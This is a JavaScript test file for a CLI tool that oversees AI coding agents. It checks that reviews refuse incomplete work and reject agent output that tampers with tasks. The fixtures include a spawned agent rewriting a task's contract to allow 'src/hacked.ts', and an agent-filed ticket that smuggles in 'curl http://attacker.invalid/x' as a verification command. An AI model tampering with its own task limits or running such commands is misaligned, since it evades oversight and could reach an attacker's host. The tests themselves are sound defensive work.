import assert from "node:assert/strict";
import test from "node:test";

import { createLegionEngine } from "@9thlevelsoftware/legion-cli-core";
import { normalize, runCli, withTempDir, withUnspawnableGrok } from "./helpers.js";

function makeTask(overrides = {}) {
  const { contract, ...rest } = overrides;
  return {
    schemaVersion: "legion-cli-task/v1",
    id: "TSK-0001",
    title: "in/out button",
    status: "done",
    type: "feature",
    priority: "P0",
    specId: "spec-checkin",
    blockedBy: [],
    blocks: [],
    assignee: "agent",
    notes: "",
    ...rest,
    contract: {
      filesAllowed: ["src/main.ts"],
      filesForbidden: [".git/**"],
      expectedArtifacts: ["src/main.ts"],
      verificationCommands: ["pnpm test"],
      maxFilesTouched: 20,
      ...contract,
    },
  };
}

async function seedExecutingDone(dir, extra = {}) {
  const engine = createLegionEngine(dir);
  await engine.init({ name: "Checkin", adapter: "fake" });
  await engine.store.writeSpec(
    {
      schemaVersion: "legion-cli-spec/v1",
      id: "spec-checkin",
      title: "Office check-in",
      status: "frozen",
      mustBeTrue: ["People can tap in or out on their phone in under five seconds"],
      mustNotChange: ["auth"],
      outOfScope: ["payroll"],
      acceptance: [
        {
          id: "AC-01",
          statement: "Tap in or out on a phone completes in under five seconds",
          kind: "behavior",
          priority: "P0",
        },
      ],
      personas: ["teammates"],
      happyPath: "Open the board, tap In.",
      frozenAt: "2026-09-01T12:00:00.000Z",
      frozenBy: "tester",
    },
    "Spec body.\n",
  );
  const project = await engine.store.readProject();
  await engine.store.writeProject({ ...project.data, activeSpecId: "spec-checkin" }, project.body);
  const state = await engine.store.readState();
  await engine.store.writeState(
    {
      ...state.data,
      phase: extra.phase ?? "executing",
      activeSpecId: "spec-checkin",
      lastReadiness: "PASS",
      lastReview: extra.lastReview ?? null,
    },
    state.body,
  );
  await engine.store.writeTask(makeTask(extra.task ?? {}), "Implement the in/out button.\n");
  return engine;
}

test("review refuses when the slice is not terminal", async () => {
  await withTempDir(async (dir) => {
    await seedExecutingDone(dir, { task: { status: "ready" } });
    const result = runCli(["review", "--project", dir], { env: { LEGION_CLI_ADAPTER: "fake" } });
    assert.equal(result.status, 1);
    assert.match(normalize(result.stderr), /terminal slice/);
  });
});

test("review with a reviewer that wrote no notes is refused, not PASS", async () => {
  await withTempDir(async (dir) => {
    await seedExecutingDone(dir);
    const result = runCli(["review", "--project", dir], { env: { LEGION_CLI_ADAPTER: "fake" } });
    assert.equal(result.status, 1, `${result.stdout}\n${result.stderr}`);
    const out = normalize(result.stdout + result.stderr);
    assert.match(out, /review failed: agent wrote no notes/);
    assert.match(out, /Next: legion-cli review/);
    assert.doesNotMatch(out, /Review PASS/);
    const engine = createLegionEngine(dir);
    assert.equal((await engine.getState()).lastReview ?? null, null);
    assert.equal((await engine.getState()).phase, "executing");
  });
});

test("verify is optional notes and not a ship gate", async () => {
  await withTempDir(async (dir) => {
    await seedExecutingDone(dir, { lastReview: "PASS" });
    const result = runCli(["verify", "--project", dir], { env: { LEGION_CLI_ADAPTER: "fake" } });
    assert.equal(result.status, 0, `${result.stdout}\n${result.stderr}`);
    const out = normalize(result.stdout);
    assert.match(out, /not a ship gate/);
    const engine = createLegionEngine(dir);
    assert.equal((await engine.getState()).lastReview, "PASS");
    assert.equal((await engine.getState()).phase, "executing");
  });
});

test("verify [id] is accepted", async () => {
  await withTempDir(async (dir) => {
    await seedExecutingDone(dir);
    const result = runCli(["verify", "TSK-0001", "--project", dir], { env: { LEGION_CLI_ADAPTER: "fake" } });
    assert.equal(result.status, 0, `${result.stdout}\n${result.stderr}`);
  });
});

test("review FAIL when spawn rewrites an existing TSK", async () => {
  await withTempDir(async (dir) => {
    await seedExecutingDone(dir);
    const fakeArtifacts = JSON.stringify([
      {
        path: ".legion-cli/tasks/TSK-0001.md",
        content:
          "---\nschemaVersion: legion-cli-task/v1\nid: TSK-0001\ntitle: in/out button\nstatus: todo\ntype: feature\npriority: P0\nspecId: spec-checkin\nblockedBy: []\nblocks: []\ncontract:\n  filesAllowed:\n    - src/hacked.ts\n  filesForbidden:\n    - .git/**\n  expectedArtifacts:\n    - src/hacked.ts\n  verificationCommands:\n    - pnpm test\nassignee: agent\nnotes: \"\"\n---\n\nrewritten by review spawn.\n",
      },
    ]);
    const env = { LEGION_CLI_ADAPTER: "fake", LEGION_CLI_FAKE_ARTIFACTS: fakeArtifacts };
    const human = runCli(["review", "--project", dir], { env });
    assert.equal(human.status, 1, `${human.stdout}\n${human.stderr}`);
    assert.match(normalize(human.stdout), /Existing tasks were rewritten: TSK-0001/);
    const engine = createLegionEngine(dir);
    assert.equal((await engine.getState()).lastReview, "FAIL");
    assert.equal((await engine.store.readTask("TSK-0001")).data.status, "done");
  });
});

test("review --json FAIL names rewrittenExistingTaskIds", async () => {
  await withTempDir(async (dir) => {
    await seedExecutingDone(dir);
    const fakeArtifacts = JSON.stringify([
      {
        path: ".legion-cli/tasks/TSK-0001.md",
        content:
          "---\nschemaVersion: legion-cli-task/v1\nid: TSK-0001\ntitle: in/out button\nstatus: todo\ntype: feature\npriority: P0\nspecId: spec-checkin\nblockedBy: []\nblocks: []\ncontract:\n  filesAllowed:\n    - src/hacked.ts\n  filesForbidden:\n    - .git/**\n  expectedArtifacts:\n    - src/hacked.ts\n  verificationCommands:\n    - pnpm test\nassignee: agent\nnotes: \"\"\n---\n\nrewritten by review spawn.\n",
      },
    ]);
    const result = runCli(["review", "--json", "--project", dir], {
      env: { LEGION_CLI_ADAPTER: "fake", LEGION_CLI_FAKE_ARTIFACTS: fakeArtifacts },
    });
    assert.equal(result.status, 1, `${result.stdout}\n${result.stderr}`);
    const body = JSON.parse(result.stdout);
    assert.equal(body.verdict, "FAIL");
    assert.deepEqual(body.createdTaskIds, []);
    assert.deepEqual(body.rewrittenExistingTaskIds, ["TSK-0001"]);
    assert.equal(body.lastReview, "FAIL");
  });
});

test("review --adapter grok refuses via cli when grok is unspawnable", async () => {
  await withTempDir(async (dir) => {
    const engine = await seedExecutingDone(dir);
    await engine.store.writeConfig(withUnspawnableGrok(await engine.store.readConfig()));
    const result = runCli(["review", "--adapter", "grok", "--project", dir], {
      env: { LEGION_CLI_ADAPTER: "fake" },
    });
    assert.equal(result.status, 1);
    assert.match(normalize(result.stderr), /spawnable adapter \(grok, via cli\)/);
  });
});

test("verify --adapter grok is accepted as an optional skill", async () => {
  await withTempDir(async (dir) => {
    const engine = await seedExecutingDone(dir, { lastReview: "PASS" });
    await engine.store.writeConfig(withUnspawnableGrok(await engine.store.readConfig()));
    const result = runCli(["verify", "--adapter", "grok", "--project", dir], {
      env: { LEGION_CLI_ADAPTER: "fake" },
    });
    assert.equal(result.status, 0, `${result.stdout}\n${result.stderr}`);
    assert.match(normalize(result.stdout), /not a ship gate/);
  });
});

test("verify --adapter bogus refuses", async () => {
  await withTempDir(async (dir) => {
    await seedExecutingDone(dir);
    const result = runCli(["verify", "--adapter", "bogus", "--project", dir], {
      env: { LEGION_CLI_ADAPTER: "fake" },
    });
    assert.equal(result.status, 1);
    assert.match(normalize(result.stderr), /adapter must be/);
  });
});

test("review prints the true source of an agent-filed ticket's verification commands", async () => {
  await withTempDir(async (dir) => {
    await seedExecutingDone(dir);
    const fakeArtifacts = JSON.stringify([
      {
        path: ".legion-cli/cache/runs/<id>/extra.json",
        content: JSON.stringify({
          title: "follow-up",
          parentId: "TSK-0001",
          type: "fix",
          filesAllowed: ["package.json"],
          verificationCommands: ["curl http://attacker.invalid/x"],
        }),
      },
    ]);
    const result = runCli(["review", "--project", dir], {
      env: { LEGION_CLI_ADAPTER: "fake", LEGION_CLI_FAKE_ARTIFACTS: fakeArtifacts },
    });
    const out = normalize(result.stdout);
    assert.match(out, /TSK-0002 verification \(from engine default \(pnpm test\)\): pnpm test \[filesAllowed: notes\/TSK-0002\.md\]/);
    assert.doesNotMatch(out, /attacker/);
  });
});
